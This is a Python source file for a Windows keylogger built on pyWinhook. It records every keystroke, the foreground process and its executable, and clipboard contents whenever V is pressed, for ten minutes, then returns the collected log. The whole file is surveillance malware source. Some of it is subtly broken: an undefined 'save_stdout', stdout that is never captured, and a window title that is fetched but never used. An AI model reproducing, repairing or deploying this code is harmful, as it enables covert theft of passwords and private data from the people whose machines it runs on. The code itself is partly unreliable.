from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10
current_window = None

def get_current_process():
    hwnd = windll.user32.GetForegroundWindow()
    pid = c_ulong(0)
    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = f'{pid.value}'

    executable = create_string_buffer(512)
    h_process = windll.kernel32.OpenProcess(0x400 | 0x010, False, pid)
    windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer(512)
    windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

    print('\n', process_id, executable.value.decode(), current_window)
    windll.kernel32.CloseHandle(hwnd)
    windll.kernel32.CloseHandle(h_process)

def mykeystoke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end='')
    else:
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print(f'[PASTE] - {value}')
        else:
            print(f' {event.Key} ')
    return True

def run():
    hm = pyHook.HookManager()
    hm.KeyDown = mykeystoke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done.')
